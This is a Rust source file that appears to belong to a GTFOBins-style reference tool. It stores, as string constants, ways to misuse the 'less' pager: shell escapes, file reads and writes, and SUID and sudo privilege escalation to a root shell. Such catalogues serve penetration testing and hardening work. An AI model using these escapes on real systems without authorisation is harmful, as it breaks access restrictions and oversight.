pub static BIN_NAME: &'static str = "less";
pub static SH_CODE_1: &'static str = r#"
    
    less /etc/profile
    !/bin/sh
"#;
pub static SH_CODE_2: &'static str = r#"
    
    VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
    v
"#;
pub static SH_CODE_3: &'static str = r#"
    
    less /etc/profile
    v:shell
"#;
pub static FW_CODE_1: &'static str = r#"
    
    echo DATA | less
    sfile_to_write
    q
"#;
pub static FW_DESC_2: &'static str =
    "This invokes the default editor to edit the file. The file must exist.";
pub static FW_CODE_2: &'static str = r#"
    
    less file_to_write
    v
"#;
pub static FR_CODE_1: &'static str = r#"
    
    less file_to_read
"#;
pub static FR_DESC_2: &'static str =
    "This is useful when `less` is used as a pager by another binary to read a different file.";
pub static FR_CODE_2: &'static str = r#"
    
    less /etc/profile
    :e file_to_read
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which less) .

    ./less file_to_read
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo less /etc/profile
    !/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SH_3: Code<'static> = Code {
    title: "SH_CODE_3",
    code: SH_CODE_3,
    tag: Tag::SH,
};
pub static FW_1: Code<'static> = Code {
    title: "FW_CODE_1",
    code: FW_CODE_1,
    tag: Tag::FW,
};
pub static FW_2: Code<'static> = Code {
    title: "FW_CODE_2",
    code: FW_CODE_2,
    tag: Tag::FW,
};
pub static FR_1: Code<'static> = Code {
    title: "FR_CODE_1",
    code: FR_CODE_1,
    tag: Tag::FR,
};
pub static FR_2: Code<'static> = Code {
    title: "FR_CODE_2",
    code: FR_CODE_2,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
